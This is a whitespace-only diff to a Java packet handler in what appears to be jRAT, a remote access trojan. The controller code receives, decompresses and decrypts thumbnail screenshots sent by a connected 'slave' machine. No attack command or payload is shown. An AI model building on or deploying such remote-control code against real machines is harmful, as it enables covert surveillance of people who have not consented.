@@ -10,7 +10,6 @@ import pro.jrat.common.crypto.Crypto;
 import pro.jrat.ui.frames.FrameRemoteThumbView;
 import pro.jrat.utils.ImageUtils;
 
-
 public class Packet59ThumbnailPreview extends AbstractIncomingPacket {
 
 	@Override
@@ -29,7 +28,7 @@ public class Packet59ThumbnailPreview extends AbstractIncomingPacket {
 
 		byte[] buffer = new byte[imageSize];
 		slave.getDataInputStream().readFully(buffer);
-		
+
 		buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
 
 		if (frame != null) {
